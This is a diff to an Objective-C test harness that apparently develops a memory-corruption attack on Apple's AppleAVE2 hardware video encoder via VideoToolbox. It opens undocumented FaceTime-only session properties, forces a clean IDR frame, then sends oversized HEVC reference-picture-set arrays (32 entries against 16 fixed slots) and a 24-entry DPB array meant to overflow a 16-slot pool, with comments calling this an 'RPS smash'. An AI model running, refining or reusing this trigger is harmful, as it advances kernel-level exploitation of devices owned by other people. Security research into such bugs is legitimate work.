@@ -64,42 +64,46 @@
     [report appendString:@"encoder session created\n"];
 
     // Phase 2: build RPS dictionary with the keys AVE_HEVC_ST_RPS_Retrieve reads
-    // (AVE_CFDict_GetBool on flags + DeltaPOCS0/1Minus1 arrays; >16 elements
-    // overflows the fixed HEVC_SHORT_TERM_RPS slots).
+    // (AVE_CFDict_GetBool on flags + delta arrays; >16 elements overflows the
+    // fixed HEVC_SHORT_TERM_RPS slots). Both key spellings kept — unknown keys
+    // are ignored, so covering DeltaPocS0 and DeltaPOCS0Minus1 can only help.
     [report appendString:@"\n--- Phase 2: build RPS ---\n"];
     NSMutableArray *deltaS0 = [NSMutableArray array];
     NSMutableArray *deltaS1 = [NSMutableArray array];
     for (int i = 0; i < 32; i++) {
-        [deltaS0 addObject:@(0x4100 + i)];
-        [deltaS1 addObject:@(0x4200 + i)];
+        [deltaS0 addObject:@(-(i + 1))];
+        [deltaS1 addObject:@(i + 1)];
     }
     NSDictionary *rpsDict = @{
         @"DeltaPOCS0Minus1": deltaS0,
         @"DeltaPOCS1Minus1": deltaS1,
-        @"NumPositivePics": @16,
-        @"NumNegativePics": @16,
-        @"UsedByCurrPicS0": @YES,
-        @"UsedByCurrPicS1": @YES,
+        @"DeltaPocS0": deltaS0,
+        @"DeltaPocS1": deltaS1,
+        @"NumPositivePics": @32,
+        @"NumNegativePics": @32,
+        @"UsedByCurrPicS0": @0xFFFFFFFFU,
+        @"UsedByCurrPicS1": @0xFFFFFFFFU,
     };
     [report appendFormat:@"RPS: S0=%lu S1=%lu entries (OOB >16 slots)\n",
      (unsigned long)deltaS0.count, (unsigned long)deltaS1.count];
 
-    // Phase 3: ONLY the valid @[rpsDict] container (ollie).
-    // A bare deltaArr (NSNumber elements) kills videocodecd before encode:
-    // AVE_HEVC_ST_RPS_RetrieveArray -> CFDictionaryContainsKey on NSNumber -> SIGABRT
-    // (videocodecd-2026-11-08-061221.ips).
-    [report appendString:@"\n--- Phase 3: UserRPSForFaceTime (@[rpsDict] only) ---\n"];
-    NSArray *propKeys = @[
-        @"UserRPSForFaceTime", @"UserRPS", @"AVEUserRPSForFaceTime",
-        @"kVTCompressionPropertyKey_UserRPSForFaceTime", @"RPS",
-        @"ReferencePictureSet", @"AVE_HEVC_RPS", @"FaceTimeRPS",
-    ];
+    // Phase 3: gates + clean IDR first, then RPS (ollie: -19640 was validation
+    // rejecting RPS before the ST_RPS context existed; frame 0 must be a clean
+    // IDR and the enable gates must be open before any RPS reaches the parser).
+    [report appendString:@"\n--- Phase 3: enable gates + clean IDR, then RPS ---\n"];
+    OSStatus stGate1 = VTSessionSetProperty(session, CFSTR("EnableUserRefForFacetime"), kCFBooleanTrue);
+    OSStatus stGate2 = VTSessionSetProperty(session, CFSTR("EnableUserRPSForFaceTime"), kCFBooleanTrue);
+    [report appendFormat:@"EnableUserRefForFacetime=YES -> %d\n", (int)stGate1];
+    [report appendFormat:@"EnableUserRPSForFaceTime=YES -> %d\n", (int)stGate2];
+
+    NSArray *propKeys = @[ @"UserRPSForFaceTime", @"AVEUserRPSForFaceTime", @"FaceTimeRPS" ];
     NSArray *propValues = @[ @[rpsDict] ];
     for (NSString *key in propKeys) {
         for (id val in propValues) {
             status = VTSessionSetProperty(session,
                 (__bridge CFStringRef)key,
                 (__bridge CFPropertyListRef)val);
+            [report appendFormat:@"session set %@ -> %d\n", key, (int)status];
             if (status == 0) {
                 [report appendFormat:@"*** SUCCESS: %@ ***\n", key];
             }
@@ -107,8 +111,8 @@
     }
     [report appendString:@"property scan done\n"];
 
-    // Phase 4: encode with frame properties
-    [report appendString:@"\n--- Phase 4: encode with frame properties ---\n"];
+    // Phase 4: encode[0] clean IDR (no RPS) -> frames 1..2 carry the smashed RPS
+    [report appendString:@"\n--- Phase 4: clean IDR then RPS smash via frameProps ---\n"];
     CVPixelBufferRef pb = NULL;
     CVPixelBufferCreate(kCFAllocatorDefault, 1920, 1080,
                          kCVPixelFormatType_420YpCbCr8BiPlanarFullRange,
@@ -118,23 +122,26 @@
         memset(CVPixelBufferGetBaseAddress(pb), 0x80, CVPixelBufferGetDataSize(pb));
         CVPixelBufferUnlockBaseAddress(pb, 0);
 
-        // Same valid container as Phase 3 — a bare dict/number array here can hit
-        // the same CFDictionaryContainsKey-on-NSNumber abort in the daemon.
-        NSDictionary *frameProps = @{@"UserRPSForFaceTime": @[rpsDict]};
         VTEncodeInfoFlags flags = 0;
-        CMTime pts = CMTimeMake(0, 30);
         CMTime dur = CMTimeMake(1, 30);
-
+        NSDictionary *idrProps = @{
+            (__bridge NSString *)kVTEncodeFrameOptionKey_ForceKeyFrame: @YES
+        };
         status = VTCompressionSessionEncodeFrame(
-            session, pb, pts, dur,
-            (__bridge CFDictionaryRef)frameProps, NULL, &flags);
-        [report appendFormat:@"encode: %d (flags=0x%x)\n", (int)status, flags];
+            session, pb, CMTimeMake(0, 30), dur,
+            (__bridge CFDictionaryRef)idrProps, NULL, &flags);
+        [report appendFormat:@"encode[0] clean IDR -> %d (flags=0x%x)\n", (int)status, flags];
 
-        pts = CMTimeMake(1, 30);
-        status = VTCompressionSessionEncodeFrame(
-            session, pb, pts, dur,
-            (__bridge CFDictionaryRef)frameProps, NULL, &flags);
-        [report appendFormat:@"encode[1]: %d\n", (int)status];
+        NSDictionary *frameProps = @{
+            @"UserRPSForFaceTime": @[rpsDict],
+            (__bridge NSString *)kVTEncodeFrameOptionKey_ForceKeyFrame: @NO
+        };
+        for (int fi = 1; fi <= 2; fi++) {
+            status = VTCompressionSessionEncodeFrame(
+                session, pb, CMTimeMake(fi, 30), dur,
+                (__bridge CFDictionaryRef)frameProps, NULL, &flags);
+            [report appendFormat:@"encode[%d] RPS smash -> %d\n", fi, (int)status];
+        }
 
         CVPixelBufferRelease(pb);
     }
@@ -216,14 +223,9 @@
         CFNumberRef rbn = NULL;
         VTSessionCopyProperty(s2, CFSTR("NumberOfTemporalLayers"), NULL, &rbn);
         if (rbn) { CFNumberGetValue(rbn, kCFNumberIntType, &rb); CFRelease(rbn); }
-        VTSessionSetProperty(s2, kVTCompressionPropertyKey_AllowFrameReordering, kCFBooleanFalse);
-        st2 = VTCompressionSessionPrepareToEncodeFrames(s2);
-        if (st2 != noErr) {
-            [report appendFormat:@"  NTL=%d set=%d readback=%d prepare=%d FAILED\n", ntl, (int)setSt, rb, (int)st2];
-            CFRelease(s2);
-            if (surfArray) CFRelease(surfArray);
-            continue;
-        }
+        // Per ollie + AVE112705 reference: NO PrepareToEncodeFrames and NO
+        // AllowFrameReordering — Prepare makes VideoToolbox clamp NTL to 1 in
+        // user-space (readback=1 at every N) and the kernel formula never runs.
         CVPixelBufferRef pb2 = NULL;
         CVPixelBufferCreate(kCFAllocatorDefault, 1280, 720,
                             kCVPixelFormatType_420YpCbCr8BiPlanarVideoRange, NULL, &pb2);
@@ -233,8 +235,12 @@
             if (surfArray) CFRelease(surfArray);
             continue;
         }
-        // Frame content is irrelevant to the NTL trigger; skip plane fill
-        // (CVPixelBufferGetDataSizeForPlane is not linkable in the CI SDK).
+        CVPixelBufferLockBaseAddress(pb2, 0);
+        size_t ySz = CVPixelBufferGetBytesPerRowOfPlane(pb2, 0) * 720;
+        memset(CVPixelBufferGetBaseAddressOfPlane(pb2, 0), 0x40, ySz);
+        size_t uvSz = CVPixelBufferGetBytesPerRowOfPlane(pb2, 1) * 360;
+        memset(CVPixelBufferGetBaseAddressOfPlane(pb2, 1), 0x80, uvSz);
+        CVPixelBufferUnlockBaseAddress(pb2, 0);
         VTEncodeInfoFlags f2 = 0;
         st2 = VTCompressionSessionEncodeFrame(s2, pb2, CMTimeMake(0, 30), kCMTimeInvalid, NULL, NULL, &f2);
         [report appendFormat:@"  NTL=%d set=%d readback=%d encode=%d %s\n", ntl, (int)setSt, rb, (int)st2,
@@ -465,9 +471,11 @@
         VTSessionSetProperty(sDPB, CFSTR("EncoderUsage"), nu);
         CFRelease(nu);
 
-        // EnableUserRefForFacetime=BOOLEAN true
+        // EnableUserRefForFacetime=BOOLEAN true (+ RPS gate, ollie)
         OSStatus stRef = VTSessionSetProperty(sDPB, CFSTR("EnableUserRefForFacetime"), kCFBooleanTrue);
         [report appendFormat:@"  EnableUserRefForFacetime=YES -> %d\n", (int)stRef];
+        OSStatus stRef2 = VTSessionSetProperty(sDPB, CFSTR("EnableUserRPSForFaceTime"), kCFBooleanTrue);
+        [report appendFormat:@"  EnableUserRPSForFaceTime=YES -> %d\n", (int)stRef2];
 
         // Encode FIRST frame to initialize encoder (AVE27 stage12 order)
         VTSessionSetProperty(sDPB, kVTCompressionPropertyKey_AllowFrameReordering, kCFBooleanTrue);
@@ -488,12 +496,22 @@
                 CVPixelBufferRelease(pb0);
             }
 
-            // NOW set UserDPBFramesForFaceTime=24 (after init)
-            int dpbFrames = 24;
-            CFNumberRef nf = CFNumberCreate(NULL, kCFNumberIntType, &dpbFrames);
-            OSStatus stFrames = VTSessionSetProperty(sDPB, CFSTR("UserDPBFramesForFaceTime"), nf);
-            CFRelease(nf);
-            [report appendFormat:@"  UserDPBFramesForFaceTime=24 (after init) -> %d\n", (int)stFrames];
+            // NOW set UserDPBFramesForFaceTime=24 (after init).
+            // Per ollie: the property demands CFArray (kVTParameterErr -12900 on
+            // a CFNumber; readback=array(0) proved the type). 24 slots overflow
+            // the standard 16-slot DPB pool in AppleAVE2.
+            NSMutableArray *dpbArray = [NSMutableArray arrayWithCapacity:24];
+            for (int i = 0; i < 24; i++) {
+                [dpbArray addObject:@{
+                    @"FrameIndex": @(i),
+                    @"PicOrderCnt": @(i * 2),
+                    @"IsLongTerm": @(NO),
+                    @"SlotIndex": @(i & 0x1F)
+                }];
+            }
+            OSStatus stFrames = VTSessionSetProperty(sDPB, CFSTR("UserDPBFramesForFaceTime"),
+                                                     (__bridge CFArrayRef)dpbArray);
+            [report appendFormat:@"  UserDPBFramesForFaceTime=array[24] (after init) -> %d\n", (int)stFrames];
 
             // DPBRequirements
             NSMutableArray *dpbReq = [NSMutableArray array];
